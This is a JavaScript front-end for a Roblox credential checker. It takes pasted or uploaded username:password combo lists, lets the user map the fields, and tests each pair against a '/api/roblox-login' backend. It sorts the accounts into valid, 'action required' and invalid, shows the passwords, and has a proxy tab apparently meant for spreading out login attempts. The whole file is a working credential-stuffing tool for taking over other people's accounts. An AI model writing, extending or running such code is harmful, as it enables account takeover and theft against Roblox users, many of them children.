let app = document.getElementById('app');
let userName = localStorage.getItem('username') || null;
let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];
let valid = [], invalid = [], actionRequired = [];
let checkingCount = 0;
let currentTab = 'accounts';
let debugMode = false;
let savedProxies = [];

function switchTab(tab) {
  currentTab = tab;
  renderTab();
}

function renderTab() {
  const tabContent = document.getElementById('tabContent');
  switch (currentTab) {
    case 'accounts':
      renderMainScreen(); // your existing main interface
      break;
    case 'proxies':
      tabContent.innerHTML = `
        <h2>Proxy Settings</h2>
        <textarea id="proxyInput" placeholder="Paste one proxy per line..."></textarea>
        <button onclick="saveProxies()">Save Proxies</button>
        <h3>Saved Proxies:</h3>
        <pre>${savedProxies.join('\n') || 'None'}</pre>
      `;
      break;
    case 'debug':
      tabContent.innerHTML = `
        <h2>Debug Mode</h2>
        <label><input type="checkbox" onchange="toggleDebug(this)"> Enable Debug Output</label>
        <div id="debugOutput" class="debug-log">${debugLog.join('\n')}</div>
      `;
      break;
  }
}

function toggleDebug(checkbox) {
  debugMode = checkbox.checked;
}

function saveProxies() {
  const input = document.getElementById('proxyInput').value.trim();
  savedProxies = input.split('\n').filter(line => line.trim());
  alert('Proxies saved!');
  renderTab(); // Refresh proxy list
}

function logout() {
  localStorage.removeItem('username');
  location.reload();
}

let debugLog = [];

function logDebug(message) {
  if (debugMode) {
    debugLog.push(message);
    const el = document.getElementById('debugOutput');
    if (el) el.textContent = debugLog.join('\n');
  }
}

function renderNameScreen() {
  app.innerHTML = `
    <div class="name-screen" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" style="padding:10px; font-size:1rem; margin-bottom:10px;">
      <button onclick="saveName()" style="padding:8px 16px; cursor:pointer;">Continue</button>
    </div>
  `;
  document.getElementById('nameInput').addEventListener('keydown', e => {
    if(e.key === 'Enter') saveName();
  });
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (name) {
    localStorage.setItem('username', name);
    userName = name;
    renderMainScreen();
  }
}

function renderMainScreen() {
  app.innerHTML = `
    <div class="main-screen" style="max-width: 800px; margin: 2rem auto; display:flex; flex-direction: column; align-items: center; font-family: Arial, sans-serif;">
      <h1>Hello, <span class="green">${userName}</span></h1>
      <textarea id="credInput" rows="8" cols="50" placeholder="Paste your credentials here..." style="width: 100%; max-width: 600px; margin-bottom: 1rem; padding: 10px; font-family: monospace;"></textarea>
      <input type="file" id="fileInput" style="margin-bottom: 1rem;">
      <button onclick="previewData()" style="padding: 8px 16px; cursor: pointer; margin-bottom: 1rem;">Preview & Assign Format</button>
      <div id="previewArea" style="width: 100%; max-width: 600px; text-align: left;"></div>
      <div id="siteSelect" class="hidden" style="width: 100%; max-width: 600px; margin-top: 1rem; text-align: center;">
        <h2>Site: <img src="https://www.roblox.com/favicon.ico" style="width:20px; vertical-align: middle;"> Roblox</h2>
        <button onclick="validateCredentials()" style="padding: 8px 16px; cursor: pointer;">Validate Credentials</button>
        <div id="progress" style="margin-top: 10px;"></div>
      </div>
      <div id="results" style="width: 100%; max-width: 600px; margin-top: 2rem;"></div>
    </div>
  `;
  document.getElementById('fileInput').addEventListener('change', () => previewData());
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|'));
  if (parsedLines.length === 0) return alert('No valid lines found.');

  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' : '|';

  const firstFew = parsedLines.slice(0, 3);
  let previewHTML = `<h2>Assign Format:</h2>`;

  const firstTokens = firstFew[0].split(delimiter);

  previewHTML += `<div class="preview-line" style="display:flex; gap:10px;">`;
  firstTokens.forEach((token, idx) => {
    previewHTML += `
      <div style="flex: 1;">
        <div class="token" style="background: #f0f0f0; padding: 6px; border-radius: 4px; font-family: monospace;">${token}</div>
        <select onchange="setFormat(${idx}, this.value)" style="width: 100%; margin-top: 4px; padding: 4px;">
          <option value="">None</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
          <option value="site">Site</option>
        </select>
      </div>
    `;
  });
  previewHTML += `</div>`;
  previewHTML += `<pre style="margin-top:1rem; font-family: monospace;">${firstFew.join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  for (let key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) {
    format[role] = index;
  }
}

async function validateCredentials() {
  if (format.username === -1 || format.password === -1) {
    return alert('Please assign Username and Password fields.');
  }

  valid = [];
  invalid = [];
  actionRequired = [];
  checkingCount = 0;
  document.getElementById('results').innerHTML = '';
  document.getElementById('progress').innerText = `Checked: 0 / ${parsedLines.length}`;

  for (const line of parsedLines) {
    const delimiter = line.includes(':') ? ':' : line.includes(',') ? ',' : '|';
    const parts = line.split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    const result = await checkRobloxCredentials(username, password);
    checkingCount++;
    document.getElementById('progress').innerText = `Checked: ${checkingCount} / ${parsedLines.length}`;

    if (result.success) {
      valid.push(result);
    } else if (result.actionRequired) {
      actionRequired.push({ username, password, reason: result.reason || 'Action Required' });
    } else {
      invalid.push({ username, password });
    }
    renderResults(valid, invalid, actionRequired);
  }
}

async function checkRobloxCredentials(username, password) {
  try {
    const res = await fetch('/api/roblox-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();

    // Example handling:
    // success = true means login good
    // success = false but reason might be action required (2FA, password reset)
    if (data.success) {
      return { username: data.username, password, userId: data.userId, success: true };
    } else if (data.actionRequired) {
      return { username, password, actionRequired: true, reason: data.reason };
    } else {
      return { username, password, success: false };
    }
  } catch (err) {
    console.error(err);
    return { username, password, success: false };
  }
}

function renderResults(validArr, invalidArr, actionArr) {
  let html = '';

  html += `<h2 style="color:green;">✅ Valid Accounts</h2>`;
  if (validArr.length === 0) html += `<p>No valid accounts yet.</p>`;
  validArr.forEach(user => {
    html += resultCard(user, 'green');
  });

  html += `<h2 style="color:orange;">⚠️ Action Required Accounts</h2>`;
  if (actionArr.length === 0) html += `<p>No accounts require action.</p>`;
  actionArr.forEach(user => {
    html += resultCard(user, 'orange', user.reason);
  });

  html += `<h2 style="color:red;">❌ Invalid Accounts</h2>`;
  if (invalidArr.length === 0) html += `<p>No invalid accounts yet.</p>`;
  invalidArr.forEach(user => {
    html += resultCard(user, 'red');
  });

  document.getElementById('results').innerHTML = html;
}

function resultCard(user, color, reason = '') {
  // Fix profile image url: Roblox userId must be number > 0, fallback if none.
  let userId = user.userId && !isNaN(user.userId) ? user.userId : 0;
  let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=50&height=50&format=png`;

  return `
    <div class="result-card" style="border: 2px solid ${color}; padding: 10px; margin: 10px 0; display:flex; align-items:center; gap: 15px; border-radius: 8px;">
      <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%; width: 50px; height: 50px;" onerror="this.onerror=null;this.src='https://www.roblox.com/favicon.ico'">
      <div style="flex-grow: 1;">
        <a href="https://www.roblox.com/users/${userId}/profile" target="_blank" style="color:${color}; font-weight: bold; font-family: monospace; text-decoration:none;">
          ${user.username}
        </a><br>
        <span class="password" 
          style="font-family: monospace; user-select: all; cursor: pointer; color: #444;"
          title="Click to toggle visibility"
          onclick="togglePasswordVisibility(this)"
          data-password="${user.password}"
        >••••••••</span>
        ${reason ? `<div style="color:${color}; font-size:0.85rem; margin-top:4px;">${reason}</div>` : ''}
      </div>
    </div>
  `;
}

function togglePasswordVisibility(el) {
  if (el.innerText === '••••••••') {
    el.innerText = el.dataset.password;
    el.style.color = '#000';
  } else {
    el.innerText = '••••••••';
    el.style.color = '#444';
  }
}

userName ? renderMainScreen() : renderNameScreen();
